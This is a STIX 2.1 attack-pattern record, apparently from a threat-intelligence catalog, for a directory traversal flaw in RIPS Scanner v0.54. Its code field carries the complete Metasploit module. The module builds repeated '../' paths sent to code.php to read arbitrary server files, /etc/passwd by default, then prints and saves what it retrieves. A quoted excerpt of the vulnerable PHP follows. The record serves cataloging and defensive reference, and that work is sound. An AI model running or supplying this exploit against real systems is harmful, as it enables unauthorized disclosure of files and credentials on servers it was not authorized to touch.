{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f0186e5-a493-4923-9151-4a42efce3458",
    "created": "2024-08-14T16:30:19.530927Z",
    "modified": "2024-08-14T16:30:19.530934Z",
    "name": "RIPS Scanner Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54 allowing to read arbitrary files with the web server privileges.  'References'     => [ ['EDB', '18660']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/rips_traversal.rb",
            "external_id": "rips_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RIPS Scanner Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54,\n        allowing to read arbitrary files with the web server privileges.\n      },\n      'References'     =>\n        [\n          ['EDB', '18660'],\n          ['URL', 'http://codesec.blogspot.com/2015/03/rips-scanner-v-054-local-file-include.html']\n        ],\n      'Author'         =>\n        [\n          'localh0t', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true,  \"The URI path to the web application\", \"/rips/\"]),\n        OptString.new('FILEPATH', [true, \"The path to the file to read\", \"/etc/passwd\"]),\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])\n      ])\n  end\n\n  def run_host(ip)\n    traversal = \"../\" * datastore['DEPTH']\n    filename = datastore['FILEPATH']\n    filename = filename[1, filename.length] if filename =~ /^\\//\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'windows', 'code.php'),\n      'vars_get' =>\n        {\n          'file' => \"#{traversal}#{filename}\"\n        }\n    })\n\n    if res &&\n        res.code == 200 &&\n        res.headers.include?('Set-Cookie') &&\n        res.body.length > 304\n\n      html = Nokogiri::HTML(res.body)\n      html_clean = html.search('.codeline').text\n      print_line(\"#{html_clean}\")\n\n      fname = datastore['FILEPATH']\n\n      path = store_loot(\n        'rips.traversal',\n        'text/plain',\n        ip,\n        html_clean,\n        fname\n      )\n\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded\")\n    end\n  end\nend\n=begin\n 102    $file = $_GET['file'];\n 103    $marklines = explode(',', $_GET['lines']);\n 104\n 105\n 106    if(!empty($file))\n 107    {\n 108            $lines = file($file);\n 109\n 110            // place line numbers in extra table for more elegant copy/paste without line numbers\n 111            echo '<tr><td><table>';\n 112            for($i=1, $max=count($lines); $i<=$max;$i++)\n 113                    echo \"<tr><td class=\\\"linenrcolumn\\\"><span class=\\\"linenr\\\">$i</span><A id='\".($i+2).'\\'></A></td></tr>';\n 114            echo '</table></td><td id=\"codeonly\"><table id=\"codetable\" width=\"100%\">';\n 115\n 116            $in_comment = false;\n 117            for($i=0; $i<$max; $i++)\n 118            {\n 119                    $in_comment = highlightline($lines[$i], $i+1, $marklines, $in_comment);\n 120            }\n 121    }\n=end\n",
    "x_mitre_contributors": [
        ""
    ]
}